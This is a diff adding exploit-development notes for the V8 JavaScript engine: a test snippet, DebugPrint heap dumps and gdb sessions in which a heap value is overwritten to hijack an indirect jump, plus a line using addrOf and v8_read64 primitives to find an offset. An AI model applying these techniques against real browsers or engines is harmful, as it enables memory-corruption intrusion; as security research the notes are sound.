@@ -1,4 +1,98 @@
 
+
+```js
+function foo() {
+    const v11 = new Int8Array(150);
+    Object(v11,...v11,v11);
+  }
+  
+  foo();
+  const dummy = new Int8Array(150);
+  %DebugPrint(dummy);
+  %SystemBreak();
+  
+  foo();
+```
+```bash
+DebugPrint: 0x3b3e0004a32d: [JSTypedArray]
+ - map: 0x3b3e00283985 <Map[76](INT8ELEMENTS)> [FastProperties]
+ - prototype: 0x3b3e00283a19 <Object map = 0x3b3e002839ad>
+ - elements: 0x3b3e00000ed1 <ByteArray[0]> [INT8ELEMENTS]
+ - embedder fields: 2
+ - cpp_heap_wrappable: 0
+ - buffer: 0x3b3e0004a2e9 <ArrayBuffer map = 0x3b3e00289fd9>
+ - byte_offset: 0
+ - byte_length: 150
+ - length: 150
+ - data_ptr: 0x3b3f00000100
+   - base_pointer: (nil)
+   - external_pointer: 0x3b3f00000100
+ - properties: 0x3b3e00000725 <FixedArray[0]>
+ - All own properties (excluding elements): {}
+ - elements: 0x3b3e00000ed1 <ByteArray[0]> {
+       0-149: 0
+ }
+ - embedder fields = {
+    0, aligned pointer: (nil)
+    0, aligned pointer: (nil)
+ }
+0x3b3e00283985: [Map] in OldSpace
+ - map: 0x3b3e002816d9 <MetaMap (0x3b3e00281729 <NativeContext[295]>)>
+ - type: JS_TYPED_ARRAY_TYPE
+ - instance size: 76
+ - inobject properties: 0
+ - unused property fields: 0
+ - elements kind: INT8ELEMENTS
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x3b3e00000069 <undefined>
+ - prototype_validity cell: 0x3b3e00000a89 <Cell value= 1>
+ - instance descriptors (own) #0: 0x3b3e00000759 <DescriptorArray[0]>
+ - prototype: 0x3b3e00283a19 <Object map = 0x3b3e002839ad>
+ - constructor: 0x3b3e00283951 <JSFunction Int8Array (sfi = 0x3b3e0027b9ed)>
+ - dependent code: 0x3b3e00000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
+ - construction counter: 0
+
+
+Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
+-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
+  RAX: 0x0000000000000000  RBX: 0x00005555555E3000  RBP: 0x00007FFFFFFFD400  RSP: 0x00007FFFFFFFD400  [e[1m][e[0;31m]o d I t s z a p c
+  RDI: 0x0000000000000000  RSI: 0x00005555555E3000  RDX: 0x00005555555E3000  RCX: 0x00003B3E00000000  RIP:[e[0;31m] 0x00007FFFF3FF3035
+  R8 : 0x00007FFFFFFFD530  R9 : 0x0000000000000053  R10: 0x00007FFFF3FB0A30  R11: 0x00007FFFF3FF3030  R12: 0x0000000000000005
+  R13: 0x00005555555E3080  R14: 0x000055555565E6E8  R15: 0x000055555565E6E8
+  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
+-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
+=> 0x7ffff3ff3035 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
+   0x7ffff3ff3036 <_ZN2v84base2OS10DebugBreakEv+6>:	ret
+   0x7ffff3ff3037:	int3
+   0x7ffff3ff3038:	int3
+   0x7ffff3ff3039:	int3
+   0x7ffff3ff303a:	int3
+   0x7ffff3ff303b:	int3
+   0x7ffff3ff303c:	int3
+-----------------------------------------------------------------------------------------------------------------------------
+v8::base::OS::DebugBreak () at ../../src/base/platform/platform-posix.cc:737
+warning: 737	../../src/base/platform/platform-posix.cc: No such file or directory
+gdb$ x/20gx 0x3b3e00000ed1+0x298d0b
+0x3b3e00299bdc:	0x00299b1d00209601	0x00299ba100299bb9
+0x3b3e00299bec:	0x00000a9100000741	0x0000aaa000299a41
+gdb$ set *0x3b3e00299bdc=0xffffffff
+gdb$ c
+Continuing.
+
+Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
+  RAX: 0x0000000000000001  RBX: 0x0000000000000000  RBP: 0x00007FFFFFFFD530  RSP: 0x00007FFFFFFFD4D8  [e[1m][e[0;31m]o d I t s z A P c
+  RDI: 0x00003B3E00299BD1  RSI: 0x00003B3E00299BB9  RDX: 0x00003B3E00000069  RCX: 0x0000000007FFFFF0  RIP:[e[0;31m] 0x00007FFF7F482F60
+  R8 : 0x00003B3E00000069  R9 : 0x000000000000005C  R10: 0x00007FFF92FF0000  R11: 0x00003B3E00299BD1  R12: 0x00003B3E00299BB9
+  R13: 0x00005555555E3080  R14: 0x00003B3E00000000  R15: 0x000055555561A980
+  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
+-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
+=> 0x7fff7f482f60:	mov    rcx,QWORD PTR [r10+rcx*1]
+   0x7fff7f482f64:	jmp    rcx
+```
+
+
 To get the offset `console.log(v8_read64(addrOf(dummy)+0x24e5a2).toString(16));` breakpoint at `./../src/common/ptr-compr.h:174` 
 `=> 0x7ffff599d5fa <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+58>:	movzx  r12d,WORD PTR [r14])`
 and calculate by 
